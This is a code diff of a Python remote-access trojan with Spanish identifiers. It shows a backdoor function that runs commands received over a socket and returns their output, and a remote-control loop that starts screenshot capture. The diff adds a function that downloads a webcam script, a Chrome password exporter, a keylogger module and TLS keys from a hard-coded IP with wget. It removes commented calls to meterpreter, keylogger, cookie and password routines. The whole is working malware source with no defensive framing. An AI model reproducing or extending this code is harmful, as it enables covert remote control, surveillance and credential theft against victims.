@@ -169,11 +169,6 @@ def passs():
 
 def backdoor(s):
 	import os,socket,sys,ssl
-	#n=socket.socket()
-	#n.bind((cliente,pto))
-	#n.listen(6)
-	#ss=ssl.wrap_socket(n,server_side=True,keyfile="llave.pem",certfile="cert.pem",ssl_version=ssl.PROTOCOL_SSLv23)
-	#s,p = ss.accept()
 	while 1:
 	    data = s.recv(1024)
 	    if "q" == data.lower():
@@ -185,17 +180,13 @@ def backdoor(s):
 	            s.send("Directorio: "+str(os.getcwd()))
 	            result='\n'
 	            continue;
-	            #s.send(str(os.getcwd()))
 	        else:
 	            result=os.popen(data).read()
 	    if (data.lower() != "q"):
 	            s.send(str(result))
 	    else:
 	        s.send(str(result))
-	        #s.close()
-	        #break;
 	        return;
-	#exit()
 
 def camara():
 	import os
@@ -225,6 +216,7 @@ def logs():
 		autKey()
 		time.sleep(60)
 
+
 def remoto():
 	import os,socket,sys,ssl
 	import threading
@@ -237,7 +229,6 @@ def remoto():
 	s,p = ss.accept()
 	data = 'W'
 	while 1:
-		#print data
 		if not data or data == 'W' or len(data)==0 or data == None:
 			data = s.recv(512)
 		if data == '1':
@@ -262,7 +253,6 @@ def remoto():
 				data = 'W'
 		elif data == '3':
 			try:
-				#pantallazoAutomatico()
 				t=threading.Thread(target=pantallazoAutomatico,name='TeRoboTuPantalla')
 				t.setDaemon(True)
 				t.start()
@@ -316,15 +306,19 @@ def remoto():
 			continue;
 	exit()
 
-#screenshot()
-#meterpreter('192.168.47.134',4444)
-#keylogger()
-#cookies()
-#passwd()
-
+def dependencias():
+	import os
+	if not os.path.isfile('./cam.py'):
+		os.system("wget http://192.168.47.147/cam.py")
+	if not os.path.isfile('./chrome-password-export.py'):
+		os.system("wget http://192.168.47.147/chrome-password-export.py")
+	if not os.path.isfile('./pyxhook.py'):
+		os.system("wget http://192.168.47.147/pyxhook.py")
+	if not os.path.isfile('./llave.pem'):
+		os.system("wget http://192.168.47.147/llave.pem")
+	if not os.path.isfile('./cert.pem'):
+		os.system("wget http://192.168.47.147/cert.pem")
 
 if __name__ == '__main__':
-	#cookies()
+	dependencias()
 	remoto()
-	#passwd()
-	#pantallazo()
